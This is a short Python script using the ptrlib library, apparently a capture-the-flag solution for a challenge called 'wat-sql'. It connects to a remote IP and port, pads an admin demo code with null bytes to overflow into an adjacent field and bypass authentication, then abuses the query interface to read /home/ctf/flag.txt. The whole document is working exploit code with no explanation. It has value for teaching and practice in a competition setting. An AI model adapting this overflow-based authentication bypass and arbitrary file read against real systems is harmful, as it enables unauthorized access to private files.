from ptrlib import *

#sock = Process("./wat-sql")
sock = Socket("13.53.39.99", 50000)

# auth
code = b'watevr-sql2019-demo-code-admin'
code += b'\x00' * (0x20 - len(code))
code += b'sey'
sock.sendafter(": ", code)

# abort read
sock.sendlineafter("Query: ", "read ")
sock.sendlineafter("from: ", "/ponta")

# read flag
sock.sendlineafter("Query: ", "read ")
sock.sendlineafter("from: ", "/home/ctf/flag.txt")
sock.sendlineafter("read: ", "0")

sock.interactive()
